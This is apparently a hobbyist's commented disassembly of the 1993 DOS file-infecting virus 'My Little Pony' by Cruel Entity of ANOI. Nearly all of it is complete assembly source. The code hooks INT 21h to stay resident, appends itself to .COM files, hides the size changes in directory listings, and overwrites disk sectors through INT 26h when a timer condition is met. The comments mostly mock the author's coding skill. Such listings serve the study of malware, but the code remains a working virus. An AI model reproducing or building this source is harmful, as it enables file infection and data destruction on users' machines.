;My Little Pony v1.00 disassembly - sort of.
;By Cruel Entity of ANOI. Related to CyberCide.

;Well, the comments are a bit bitchy, probably coz I was in a really
;really bad mood when I wrote them. The virus author, Cruel Entity,
;knows how to make a nice virus, he just doesn't have enough assembly
;experience to make something really worth while, imho of course.

;Bummer: Still some loc_xxx's left, hrmpf, I won't care if you don't.

;Just dump this one in your misc. garbage area dude.. :-)
		
		.model tiny

		.code

		org     100h

start:
		call    get_relative
get_relative:                
		pop     bp
		
		mov     ax,0DD22h
		int     21h                     ;Installation check.
		cmp     ax,3D33h
		jne     not_installed

;*              lea     dx, [bp+restore_carrier-get_relative]                
		db      08dh, 56h, 52h
		
		jmp     dx

not_installed:
		mov     ax,3521h
		int     21h                     ;Get int21 vector
		
		mov     [bp+int21offset-get_relative],bx
		mov     [bp+int21seg-get_relative],es        ;Store it.

		mov     ax,cs
		dec     ax
		mov     es,ax                   ;ES:0 points to MCB.

		mov     ax,es:[3]
		sub     ax,[bp+parasize-get_relative]
		mov     es:[3],ax               ;Shrink blocksize.

		mov     ax,[bp+parasize-get_relative]
		sub     es:[12h],ax             ;Free top mem.
		
		mov     es,es:[12h]
		push    es
		lea     si,[bp-3]               ;SI points to start of
						;virus.
		mov     di,100h
		mov     cx,[bp+virussize-get_relative]
		rep     movsb                   ;Copy virus up there.
		
		pop     ds
		
		mov     ax,2521h
		mov     dx, offset int21
		int     21h                     ;Set new int21 vector.
		
restore_carrier:                
		push    cs
		push    cs
		pop     ds
		pop     es
		lea     si,[bp+restore_bytes-get_relative]
		mov     cx,3
		mov     di,100h
		rep     movsb                   ;Restore host.
		sub     di,3
		jmp     di                      ;Restart host.

db      'Simple Simon met a pieman going to the fair said Simple Simon to '
db      'the pieman let me take your ware'

activate:
		cmp     dh,0                    ;Seconds 0?
		jne     no_activate
		cmp     dl,5                    ;Hundredth's less than 5?
		ja      no_activate

		pushf
		push    bx
		call    get_random

		mov     cx,0Ah
		xor     dx,dx
		div     cx
		mov     dx,ax
		mov     al,2
		mov     cx,1
		mov     bx,offset anoi
kill_sector:
		int     26h                     ;Sector write.
		
		popf
		inc     al
		
		cmp     al, 25
		jne     kill_sector

		pop     bx
		popf
		jmp     short no_activate
		
		db      '(c)1993 Cruel Entity'
		
int21:                
		pushf
		cmp     ax, 0dd22h
		jz      inst_chk
		cmp     ah,11h
		jz      fcb_stealth
		cmp     ah,12h
		jz      fcb_stealth
		cmp     ah,4eh
		jz      go_handle_stealth
		cmp     ah,4fh
		jz      go_handle_stealth
		cmp     ah,3dh
		jz      go_file_open
		cmp     ah,3eh
		jz      go_file_close
		cmp     ah,2ch
		jz      get_time

		push    ax
		push    cx
		push    dx
		mov     ah, 2ch                 ;Get DOS time.
		int     21h

		cmp     cl,0
		jz      activate

no_activate:
		pop     dx
		pop     cx
		pop     ax

get_time:
		cmp     ah,36h
		jne     _pass_int
		
		push    bp
		mov     bp,offset loc_20
		jmp     bp
_pass_int:                
		popf                            ; Pop flags
pass_int:                
		db      0eah
int21offset     dw      0
int21seg        dw      0

go_handle_stealth:
		push    bp
		mov     bp,offset handle_stealth
		jmp     bp

go_file_open:
		push    bp
		mov     bp,offset file_open
		jmp     bp
go_file_close:
		push    bp
		mov     bp,offset file_close
		jmp     bp

inst_chk:                
		popf
		mov     ax,3D33h
		iret

call_dos:
		jmp     dword ptr cs:[int21offset]
		db      0C3h

fcb_stealth:                
		popf
		pushf
		
		push    cs
		call    call_dos                ;First let's see what
						;DOS has to say..

		cmp     al,0FFh                 ;0FFH indicates
						;no match found
		je      exit_fcb_stealth
match_found:
		pushf
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    ds
		push    es
		push    bp                      ;Push the lot.
		
		mov     ah,2Fh
		int     21h                     ;Get DTA
		
		push    es
		pop     ds                      ;DS:BX points to DTA.

		mov     si,bx                   ;DS:SI points to DTA.
		
		add     si,10h                  ;SI points to extension.
						;<EXTENDED FCB ONLY!>

						;(lamer)
		
		lodsw
		cmp     ax,'OC'                 ;Extension starts with CO?
		jne     no_fcb_stealth

		lodsb
		cmp     al,'M'                  ;Last char M?
		jne     no_fcb_stealth

		mov     si,bx
		add     si,26h                  ;I don't mean to sound
						;bitchy, but IMO,
						;ADD SI, 13h would've
						;been what normal persons
						;would've done.

						;Offset 26h is a reserved
						;position within an
						;extended FCB.

						;<INFECTION MARK>

		lodsw
		cmp     ax,0                    ;OR AX,AX? Naaaah!
		jne     no_fcb_stealth

		mov     si,bx
		add     si,1Eh                  ;offset 1eh is the high
						;byte of file time.
		lodsw
		and     al,1Fh
		cmp     al,0Ah
		je      proceed_fcb_stealth

		mov     dx,offset loc_17
		jmp     dx
proceed_fcb_stealth:                
		mov     si,bx
		add     si,24h                  ;If I remember correctly,
						;this is an undocumented
						;copy of the filesize within
						;the FCB structure. THIS
						;is the value that is
						;printed in a dir listing.
		
		mov     di,si
		lodsw
		sub     ax,cs:virussize         ;Hm, I can't seem to figure
		jz      no_fcb_stealth          ;out if this guy is just
		stosw                           ;stupid or ignorant when it
						;comes to asm.
no_fcb_stealth:
		pop     bp
		pop     es
		pop     ds
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		popf

exit_fcb_stealth:
		retf    2

db      '%%% MY LITTLE PONY %%% '
db      'COPYRIGHT(C) 1993 A.N.O.I. %%%'

loc_17:
		mov     si,bx
		add     si,8
		push    cs
		pop     es
		mov     cx,0Ah
		mov     di,offset something

locloop_18:
		cmp     byte ptr es:[di],' '
		je      loc_19
		add     di,8
		loop    locloop_18

		jmp     short no_fcb_stealth
loc_19:
		mov     cx,8
		rep     movsb
		jmp     short no_fcb_stealth

loc_20:
		pop     bp
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    ds
		push    es
		push    bp                      ;Push some regs.

		push    cs
		push    cs
		pop     ds
		pop     es                      

		mov     di,offset something
		mov     cx,0Ah

locloop_21:
		cmp     byte ptr [di],' '
		je      loc_22
		push    di
		push    cx
		mov     si,di
		call    try_infect
		pop     cx
		pop     di
		add     di,8
		loop    locloop_21

loc_22:
		push    cs
		pop     es
		mov     di,offset something
		mov     cx,5Ch
		mov     al,' '
		rep     stosb
		pop     bp
		pop     es
		pop     ds
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		popf
		jmp     pass_int

try_infect:                                     ;JESUS! It's actually
						;a subroutine!!

						;He knows what a sub
						;IS!! Wow! I'm shocked!
		mov     di,offset filename
		mov     cx,8

copyloop2:
		lodsb
		cmp     al,' '
		je      endcopy2
		stosb
		loop    copyloop2
endcopy2:
		
		mov     al,'.'
		stosb
		mov     al,'C'
		stosb
		mov     al,'O'
		stosb
		mov     al,'M'
		stosb
		mov     al,0
		stosb 

		push    cs
		pop     ds
		
		mov     ax,4300h
		mov     dx,offset filename
		int     21h                     ;Get attributes.
		
		jnc     got_attributes
		retn
got_attributes:                
		push    cx
		xor     cx,cx
		mov     ax,4301h
		int     21h                     ;Zoink attributes.
		
		mov     ax,3D02h
		mov     dx,609h
		pushf                           ;Open file in read/write mode.
		
		push    cs
		call    call_dos

		mov     bx,ax                   ;Handle to BX

		mov     ax,5700h
		int     21h                     ;Get file date/time.
		
		push    dx
		push    cx
		and     cl,1Fh
		cmp     cl,0Ah
		jne     continue_infect

		mov     dx,offset exit_infect
		jmp     dx
continue_infect:
		mov     ah,3Fh
		mov     cx,3
		mov     dx,offset restore_bytes
		int     21h                     ;Read first three bytes.
		
		mov     ax,4202h
		xor     dx,dx
		xor     cx,cx
		int     21h                     ;Seek to EOF
		
		sub     ax,3

		mov     jmp_data,ax
		mov     ah,40h
		mov     dx,100h
		mov     cx,virussize
		int     21h                     ;Append virus to file.
		
		mov     ax,4200h
		xor     dx,dx
		xor     cx,cx
		int     21h                     ;Seek to start.
		
		mov     ah,40h
		mov     cx,3
		mov     dx,offset jmp_op
		int     21h                     ;Overwrite with JMP

exit_infect:
		pop     cx
		pop     dx
		and     cl,0E0h
		or      cl,0Ah
		mov     ax,5701h
		int     21h                     ;Givvit the special date/time
						;already-infected type
						;designation treatment..

		
		mov     ah,3Eh
		pushf
		push    cs
		call    call_dos                ;CL00000000SE 'r up!

		mov     ax,4301h
		mov     dx,offset filename
		pop     cx
		int     21h                     ;Restore kuhl attribs..
		
		ret

handle_stealth:
		pop     bp
		popf
		pushf
		push    cs
		call    call_dos
		jnc     handle_match_found
		retf    2
handle_match_found:                
		pushf
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    ds
		push    es
		push    bp                      ;Push the lot.
		mov     ah,2Fh
		int     21h                     ;Get DTA
		
		push    es
		pop     ds                      ;DS:BX points to DTA.
		mov     si,bx                   ;DS:SI points to DTA.

		push    cs
		pop     es

		add     si,1Eh                  ;1eh is start of filename
						;within the DTA struct.
		mov     di,offset filename
		mov     cx,25

copyloop:                
		lodsb
		cmp     al,0
		je      end_copy                ;Copy filename to buffer.
		stosb
		loop    copyloop

end_copy:                
		mov     al,0
		stosb                           ;Make it a valid ASCIIZ
						;string.
		push    ds
		pop     es
		push    cs
		pop     ds
		
		mov     si,di
		sub     si,4                    ;Assume extension is three
						;characters.

		lodsw 
		cmp     ax,'OC'
		je      starts_with_co
		cmp     ax,'oc'
		jne     no_handle_stealth
starts_with_co:                
		lodsb
		cmp     al,'m'
		je      com_file
		cmp     al,'M'
		jne     no_handle_stealth
com_file:                
		push    es
		pop     ds
		mov     si,bx
		add     si,1Ch                  ;High word of filesize.
		lodsw
		cmp     ax,0                    ;COM file -> not bigger
						;than 64 kb -> highword
						;=0. Just an additional
						;check. but OR AX,AX?
						;Cuz n0t!
		jne     no_handle_stealth

		mov     si,bx
		add     si,16h                  ;File time.
		lodsw
		and     al,1Fh
		cmp     al,0Ah
		jne     no_handle_stealth

		mov     si,bx
		add     si,1Ah                  ;Low word of filesize.
		
		mov     di,si
		lodsw
		sub     ax,cs:virussize
		jz      no_handle_stealth
		stosw
no_handle_stealth:
		pop     bp
		pop     es
		pop     ds
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		popf
		retf    2

file_open:
		pop     bp
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    bp
		push    ds
		push    es                      ;Save some regs.
		
		mov     al,'.'
		push    ds
		pop     es
		mov     di,dx                   ;ES:DI points to filename.
		
		mov     cx,32h
		repne   scasb                   ;Scan for '.'
		mov     si,di
		lodsw
		cmp     ax,'OC'
		je      pffff_this_is_boring
		cmp     ax,'oc'
		je      pffff_this_is_boring
		
		mov     dx,offset exit_disinfect
		jmp     dx

pffff_this_is_boring:                
		lodsb
		cmp     al,'m'
		je      try_disinfect
		cmp     al,'M'
		jne     exit_disinfect
try_disinfect:
		mov     ax,3D02h
		pushf
		push    cs
		call    call_dos                ;Open file in read/write
						;mode.
		jc      exit_disinfect

		mov     bx,ax                   ;Handle to BX.

		push    cs
		pop     ds
		push    cs
		pop     es
		mov     ax,5700h
		int     21h                     ;Get file date/time.
		
		and     cl,1Fh
		cmp     cl,0Ah
		jne     exit_disinfect
		mov     ax,4202h
		xor     dx,dx
		xor     cx,cx                   ;CWD? naaaaaaaah!
		int     21h                     ;Seek to EOF
		
		push    ax
		sub     ax,3                    ;Filesize-3
		mov     dx,ax
		mov     ax,4200h
		mov     cx,0
		int     21h                     ;Seek to EOF-3.
		
		mov     ah,3Fh
		mov     cx,3
		mov     dx,offset buf
		int     21h
		
		mov     ax,4200h
		xor     cx,cx
		xor     dx,dx                   ;Boooooriiing.
		int     21h                     ;Seek to BOF BOF BOF.
		
		mov     ah,40h
		mov     cx,3
		mov     dx,offset buf
		int     21h
		
		pop     dx
		sub     dx,virussize
		mov     ax,4200h
		mov     cx,0
		int     21h                     ;Seek to EOF-virussize.
		
		mov     ah,40h
		mov     cx,0
		int     21h                     ;Truncate file.
		
		mov     ah,3Eh
		pushf
		push    cs
		call    call_dos                ;close file.
exit_disinfect:
		pop     es
		pop     ds
		pop     bp
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		popf
		pushf
		push cs
		call    call_dos
		retf    2

file_close:
		pop     bp
		push    ax
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    bp
		push    ds
		push    es                      ;Hmpf. I suppose nobody
						;knows what subroutines
						;are these days..

		mov     ax,1220h
		int     2Fh 
		mov     bl,es:[di]
		mov     ax,1216h
		int     2Fh                     ;Awright, grabbed SFT ptr.
		
		mov     bp,di
		add     di,28h                  ;File extension.
		
		push    es
		pop     ds
		mov     si,di
		lodsw
		cmp     ax,'OC'                 ;AAARRRGGHh wibble wibble!
						;I can't take much more
						;of diiizzzzzzzzzzzz..
		jne     exit_disinfect
		lodsb
		cmp     al,'M'
		jne     exit_disinfect
		
		mov     si,bp
		add     si,20h                  ;Filename.
		push    cs
		pop     es
		call    try_infect              ;HUUUH? A SUBROUTINE?
		jmp     short exit_disinfect

get_random:
		push    dx
		push    cx
		push    bx
		in      al,40h                  ;Timer data.
		add     ax,0
		mov     dx,0
		mov     cx,7

randomloop:                
		shl     ax,1                    ; Shift w/zeros fill
		rcl     dx,1                    ; Rotate thru carry
		mov     bl,al
		xor     bl,dh
		jns     no_sign
		inc     al
no_sign:                
		loop    randomloop

		pop     bx
		mov     al,dl
		pop     cx
		pop     dx
		retn

anoi            db      '>>>  A.N.O.I  <<<'

buf             db      3 dup (0)

virussize       dw      (endvirus-start)

parasize        dw      'd'

something       db      '                                '
		db      '                                '
		db      '                '

filename        db      12 dup (0)

jmp_op          db      0E9h
jmp_data        dw      0
restore_bytes   db      90h
		db      0CDh, 20h
endvirus:

		end     start
